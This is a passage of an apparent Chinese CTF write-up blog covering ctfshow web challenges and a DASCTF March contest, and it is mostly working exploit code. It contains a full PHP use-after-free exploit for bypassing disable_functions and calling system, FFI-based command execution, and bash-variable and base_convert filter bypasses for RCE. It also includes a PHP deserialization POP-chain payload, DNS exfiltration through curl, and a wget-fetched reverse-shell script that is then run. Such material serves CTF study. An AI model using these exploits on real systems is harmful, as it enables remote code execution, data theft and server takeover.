die(&quot;Couldn&#39;t parse ELF header&quot;); &#125; if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#39;t get basic_functions address&quot;); &#125; if(!($zif_system &#x3D; get_system($basic_funcs))) &#123; die(&quot;Couldn&#39;t get zif_system address&quot;); &#125; # fake closure object $fake_obj_offset &#x3D; 0xd0; for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit(); &#125; pwn(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush(); //上边这个脚本过不了的原因是题目环境禁用了str_repeat，所以手动重复79个A就行了 群主给的 c&#x3D;function ctfshow($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace &#x3D; (new Exception)-&gt;getTrace(); if(!isset($backtrace[1][&#39;args&#39;])) &#123; $backtrace &#x3D; debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123; $address &#x3D; 0; for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123; $address &lt;&lt;&#x3D; 8; $address |&#x3D; ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m &#x3D; 8) &#123; $out &#x3D; &quot;&quot;; for ($i&#x3D;0; $i &lt; $m; $i++) &#123; $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff)); $ptr &gt;&gt;&#x3D; 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123; $i &#x3D; 0; for($i &#x3D; 0; $i &lt; $n; $i++) &#123; $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff)); $v &gt;&gt;&#x3D; 8; &#125; &#125; function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak &#x3D; strlen($helper-&gt;a); if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type &#x3D; leak($base, 0x10, 2); $e_phoff &#x3D; leak($base, 0x20); $e_phentsize &#x3D; leak($base, 0x36, 2); $e_phnum &#x3D; leak($base, 0x38, 2); for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123; $header &#x3D; $base + $e_phoff + $i * $e_phentsize; $p_type &#x3D; leak($header, 0, 4); $p_flags &#x3D; leak($header, 4, 4); $p_vaddr &#x3D; leak($header, 0x10); $p_memsz &#x3D; leak($header, 0x28); if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr; $data_size &#x3D; $p_memsz; &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; $text_size &#x3D; $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) &#x3D; $elf; for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123; $leak &#x3D; leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); if($deref !&#x3D; 0x746e6174736e6f63) continue; &#125; else continue; $leak &#x3D; leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); if($deref !&#x3D; 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base &#x3D; 0; $start &#x3D; $binary_leak &amp; 0xfffffffffffff000; for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123; $addr &#x3D; $start - 0x1000 * $i; $leak &#x3D; leak($addr, 0, 7); if($leak &#x3D;&#x3D; 0x10102464c457f) &#123; return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr &#x3D; $basic_funcs; do &#123; $f_entry &#x3D; leak($addr); $f_name &#x3D; leak($f_entry, 0, 6); if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; return leak($addr + 8); &#125; $addr +&#x3D; 0x20; &#125; while($f_entry !&#x3D; 0); return false; &#125; function trigger_uaf($arg) &#123; $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;); $vuln &#x3D; new Vuln(); $vuln-&gt;a &#x3D; $arg; &#125; if(stristr(PHP_OS, &#39;WIN&#39;)) &#123; die(&#39;This PoC is for *nix systems only.&#39;); &#125; $n_alloc &#x3D; 10; $contiguous &#x3D; []; for($i &#x3D; 0; $i &lt; $n_alloc; $i++) $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;); trigger_uaf(&#39;x&#39;); $abc &#x3D; $backtrace[1][&#39;args&#39;][0]; $helper &#x3D; new Helper; $helper-&gt;b &#x3D; function ($x) &#123; &#125;; if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123; die(&quot;UAF failed&quot;); &#125; $closure_handlers &#x3D; str2ptr($abc, 0); $php_heap &#x3D; str2ptr($abc, 0x58); $abc_addr &#x3D; $php_heap - 0xc8; write($abc, 0x60, 2); write($abc, 0x70, 6); write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj &#x3D; str2ptr($abc, 0x20); $binary_leak &#x3D; leak($closure_handlers, 8); if(!($base &#x3D; get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#39;t determine binary base address&quot;); &#125; if(!($elf &#x3D; parse_elf($base))) &#123; die(&quot;Couldn&#39;t parse ELF header&quot;); &#125; if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#39;t get basic_functions address&quot;); &#125; if(!($zif_system &#x3D; get_system($basic_funcs))) &#123; die(&quot;Couldn&#39;t get zif_system address&quot;); &#125; $fake_obj_offset &#x3D; 0xd0; for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); write($abc, 0xd0 + 0x68, $zif_system); ($helper-&gt;b)($cmd); exit(); &#125; ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush(); #需要通过url编码哦 web73-74c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;include(&#39;&#x2F;flagc.txt&#39;);exit(); Web75-76读目录，发现flag36.txt，但是不能包含，uaf失败 用mysql的load_file读取文件 c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;, &#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row) &#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-getMessage();exit(0);&#125;exit(0); 感觉。。。正常应该是不会这样的 ，没用户名和密码怎么读 web77利用FFI，php7.4以上才有 $ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;创建一个system对象 $a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;没有回显的 这里因为不能回显，所以利用重定向将readflag内容输出到其他地方 $ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数 https://www.php.net/manual/zh/ffi.cdef.php https://www.php.cn/php-weizijiaocheng-415807.html 实话实话没太看懂 c&#x3D;$ffi&#x3D;FFI::cdef(&quot;int system(char *command);&quot;, &quot;libc.so.6&quot;);$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);exit(); 打完payload访问一下1.txt就能拿到flag 后边的题感觉有点玄幻了，就单纯的记一下方法 web118 源码里有system($code);但是有waf !preg_match(&#39;&#x2F;\\x09|\\x0a|[a-z]|[0-9]|\\&#x2F;|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\&#x3D;|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#39;|\\&quot;|\\&#96;|\\||\\,&#x2F;&#39; 利用bash内置变量来rce $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.??? # echo $&#123;PWD&#125; &#x2F;root # echo $&#123;PWD:0:1&#125; #表示从0下标开始的第一个字符 &#x2F; # echo $&#123;PWD:~0:1&#125; #从结尾开始往前的第一个字符 t # echo $&#123;PWD:~0&#125; t # echo $&#123;PWD:~A&#125; #所以字母和0具有同样作用 t # echo $&#123;PATH&#125; &#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin &#x2F;&#x2F;利用系统变量构造nl命令 $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.??? $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;是nl 或者 $&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.??? SHLVL&#96;是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时&#96;$&#123;SHLVL&#125;&#x3D;1&#96;，然后在此shell中再打开一个shell时&#96;$&#123;SHLVL&#125;&#x3D;2&#96;。 &#96;$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;&#96;就输出&#96;&#x2F; $&#123;#&#125;是0，$&#123;SHLVL&#125;为1&#96; &#96;$&#123;#PWD&#125;是回显字符数，$&#123;PWD&#125; 是&#x2F;root，$&#123;#PWD&#125;是5 web119禁用了$&#123;PATH $&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; &#x3D;&#x3D;&#x3D;&#x3D;&gt; t $&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125; &#x3D;&#x3D;&#x3D;&#x3D;&gt; &#x2F; $&#123;SHLVL&#125; &#x2F;&#x2F;一般是一个个位数 $&#123;#SHLVL&#125; &#x2F;&#x2F;1，表示结果的字符长度 $&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125; &#x2F;&#x2F;表示&#x2F; $&#123;USER&#125; &#x2F;&#x2F;www-data $&#123;PHP_VERSION:~A&#125; &#x2F;&#x2F;2 $&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; &#x2F;&#x2F;at &#x2F;bin&#x2F;cat flag.php $&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.??? $&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.??? web120&lt;?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST[&#39;code&#39;]))&#123; $code&#x3D;$_POST[&#39;code&#39;]; if(!preg_match(&#39;&#x2F;\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\&#x2F;|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\&#x3D;|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#39;|\\&quot;|\\&#96;|\\||\\,&#x2F;&#39;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;; &#125; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;; &#125; &#125; ?&gt; payload $&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.??? 或者 $&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.??? web121 &lt;?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST[&#39;code&#39;]))&#123; $code&#x3D;$_POST[&#39;code&#39;]; if(!preg_match(&#39;&#x2F;\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\&#x2F;|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\&#x3D;|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#39;|\\&quot;|\\&#96;|\\||\\,&#x2F;&#39;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;; &#125; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;; &#125; &#125; ?&gt; 相比上一题，多过滤了一个SHLVL，那就用#?代替 payload $&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.??? 相当于 /bin/bash64 flag.php 或者 $&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.??? &#x2F;bin&#x2F;rev web122&lt;?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST[&#39;code&#39;]))&#123; $code&#x3D;$_POST[&#39;code&#39;]; if(!preg_match(&#39;&#x2F;\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\&#x2F;|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\&#x3D;|\\^|\\*|\\x26|#|%|\\&gt;|\\&#39;|\\&quot;|\\&#96;|\\||\\,&#x2F;&#39;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;; &#125; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;; &#125; &#125; ?&gt; payload 通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误 code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.??? *#可能存在成功的机会，不断刷新* web124&lt;?php &#x2F;* # -*- coding: utf-8 -*- # @Author: 收集自网络 # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-10-06 14:04:45 *&#x2F; error_reporting(0); &#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&#39;c&#39;]))&#123; show_source(__FILE__); &#125;else&#123; &#x2F;&#x2F;例子 c&#x3D;20-1 $content &#x3D; $_GET[&#39;c&#39;]; if (strlen($content) &gt;&#x3D; 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist &#x3D; [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\\[&#39;, &#39;\\]&#39;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;]; preg_match_all(&#39;&#x2F;[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*&#x2F;&#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; &#x2F;&#x2F;帮你算出答案 eval(&#39;echo &#39;.$content.&#39;;&#39;); &#125; 不能有特殊字符，不能有除whitelist里面的字母，大概思路就是利用进制转换以数字构造字母题中可用的进制转换函数：&#39;base_convert&#39;, &#39;bindec&#39;,&#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39; $_GET[abs]($_GET[acos]) &#x2F;&#x2F;strlen($content) &gt;&#x3D; 80，有长度限制，所以利用get命令执行 ↓ $_GET&#123;abs&#125;($_GET&#123;acos&#125;) &#x2F;&#x2F;[]在黑名单，用&#123;&#125;代替 ↓ $pi&#x3D;_GET;$$pi&#123;abs&#125;($$pi&#123;acos&#125;) ↓ 进制转换 base_convert(number,frombase,tobase)：在任意进制之间转换数字 dechex()：把十进制数转换为十六进制数 hex2bin()：把十六进制值的字符串转换为二进制，返回 ASCII 字符 最重要的是hex2bin函数，但是不在白名单里面 base_convert构造hex2bin（我想用base_convert直接转_GET，但是只能得到get） base_convert(&#39;hex2bin&#39;,36,10) → 37907361743 _GET → hex十六进制 5f474554 (不能有字母所以十六进制不行) → dec十进制 1598506324 (在线转换) 所以_GET可以写为 hex2bin(dechex(1598506324)) ↓ base_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324)) 最后的payload ?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;ls ?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;cat * payload1： ?c&#x3D;$pi&#x3D;base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) 添加头部信息：1&#x3D;tac flag.php payload2： ?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;);&amp;abs&#x3D;system&amp;acos&#x3D;tac flag.php","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"dasctf三月赛复现","slug":"dasctf三月赛复现","date":"2022-03-30T05:43:48.000Z","updated":"2022-04-08T02:27:17.240Z","comments":true,"path":"2022/03/30/dasctf三月赛复现/","link":"","permalink":"https://ethe448.github.io/2022/03/30/dasctf%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"WEB感觉这次的题不是很难，不至于像之前那样复现都复现不了，不过自己还是太菜了，web只出了一个，这里主要是复现一下web方面 ezpop确实是一个简单的php &lt;?php class crow &#123; public $v1; public $v2; function eval() &#123; echo new $this-&gt;v1($this-&gt;v2); &#125; public function __invoke() &#123; $this-&gt;v1-&gt;world(); &#125; &#125; class fin &#123; public $f1; public function __destruct()&#x2F;&#x2F;反序列化的入口 &#123; echo $this-&gt;f1 . &#39;114514&#39;; &#125; public function run() &#123; ($this-&gt;f1)(); &#125; public function __call($a, $b) &#123; echo $this-&gt;f1-&gt;get_flag(); &#125; &#125; class what &#123; public $a; public function __toString() &#123; $this-&gt;a-&gt;run(); return &#39;hello&#39;; &#125; &#125; class mix &#123; public $m1; public function run() &#123; ($this-&gt;m1)(); &#125; public function get_flag() &#123; eval(&#39;#&#39; . $this-&gt;m1); &#125; &#125; if (isset($_POST[&#39;cmd&#39;])) &#123; unserialize($_POST[&#39;cmd&#39;]); &#125; else &#123; highlight_file(__FILE__); &#125; 完整的反序列化链为 fin::destruct-&gt;what::tostring-&gt;mix::run-&gt;crow::invoke-&gt;fin::call-&gt;mix:get_flag 在get_flag函数里可以利用换行符来防止自己的命令被其中的井号注释，达到命令执行的目的 class crow &#123; public $v1; public $v2; &#125; class fin &#123; public $f1; &#125; class what &#123; public $a; &#125; class mix &#123; public $m1; public function get_flag() &#123; eval(&#39;#&#39; . $this-&gt;m1); &#125; &#125; $a &#x3D; new fin(); $a -&gt;f1 &#x3D; new what(); $a -&gt;f1-&gt;a &#x3D; new mix(); $a -&gt;f1-&gt;a-&gt;m1 &#x3D; new crow(); $a -&gt;f1-&gt;a-&gt;m1-&gt;v1 &#x3D; new fin(); $a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1 &#x3D; new mix(); $a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1 &#x3D; &quot;%0a;system(&#39;ls&#39;);&quot;; echo serialize($a); &#x2F;&#x2F;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:17:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125; 因为我这里是用的%0a，应该是解析的时候把它变成了\\n，所以这个值的长度其实是要比反序列化出的长度要少1 最终payload： O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:16:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125; 然后cat读文件 O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:162:&quot;%0a;system(&#39;cat H0mvz850A.php H0mvz850B.php H0mvz850C.php H0mvz850D.php H0mvz850E.php H0mvz850F.php H0mvz850G.php H0mvz850q.php H0mvz850z.php flag.php index.php&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125; calcapp.py #coding&#x3D;utf-8 from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory import random from urllib import parse import os from werkzeug.utils import secure_filename import time app&#x3D;Flask(__name__) def waf(s): blacklist &#x3D; [&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;] flag &#x3D; True for no in blacklist: if no.lower() in s.lower(): flag&#x3D; False print(no) break return flag @app.route(&quot;&#x2F;&quot;) def index(): &quot;欢迎来到SUctf2022&quot; return render_template(&quot;index.html&quot;) @app.route(&quot;&#x2F;calc&quot;,methods&#x3D;[&#39;GET&#39;]) def calc(): ip &#x3D; request.remote_addr num &#x3D; request.values.get(&quot;num&quot;) log &#x3D; &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; .&#x2F;tmp&#x2F;log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num) if waf(num): try: data &#x3D; eval(num) os.system(log) except: pass return str(data) else: return &quot;waf!!&quot; if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;5000) 对输入的内容先当作python语句执行，然后再执行log 比赛的时候想的是绕过然后ssti注入，但是过滤的实在太多了 所以只能放弃ssti来想对os.system的利用 因为log = &quot;echo {0} {1} {2}&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num) 也就是说它会把这些内容输出存到log.txt里 本地尝试一下可以发现，如果echo 里用反引号加命令是可以执行的，而执行的结果会输入到log.txt中 但是如果我们直接将 num&#x3D;&#96;ls&#96; 输入，就会导致前边的eval函数报错，也就不会执行后面的system了。所以这时候我们就要利用井号来进行注释 #再python中作为注释符来使用，但是在Linux中只有在句首的位置才能当作注释 我们可以利用这个特性来实现对eval的绕过 #将后边的值都注释了，也就不会让eval报错了 而对于Linux 既然井号可以绕过eval来执行我们的命令，那我们再试试能不能利用通配符直接读flag（这里其实应该先外带log.txt的内容看flag在的文件名的，但是复现的时候忘了 http:&#x2F;&#x2F;95b2c2f7-fe16-46a0-bdf8-81f18ab7b14e.node4.buuoj.cn:81&#x2F;calc?num&#x3D;7%23&#96;curl%09\\&#96;cat%09*1*\\&#96;.locsor.dnslog.cn&#96; 成功了 但是显然因为dnslog一次只能带一条信息，而|又被ban掉了，不能利用sed来看其他的文件，所以猜到flag的难度很大，所以我们可以用wget来让靶机反弹shell 1.sh就是一个正常的反弹shell的语句 &#x2F;calc?num&#x3D;7%23&#96;wget%09-P%09&#x2F;var%09http:&#x2F;&#x2F;ip&#x2F;1.sh&#96; 给一个可执行权限 &#x2F;calc?num&#x3D;7*7%23&#96;chmod%09777%09&#x2F;var&#x2F;1.sh&#96; 然后执行 &#x2F;calc?num&#x3D;7*7%23&#96;&#x2F;var&#x2F;1.sh&#96; 拿到flag，和dnslog外带的结果一样 upgdstore只能传php，但是传php又会被过滤 这里把Content-Type改成image/jpeg就能绕过 eval应该是被过滤了，传马传不上去，可以先传个phpinfo()看看 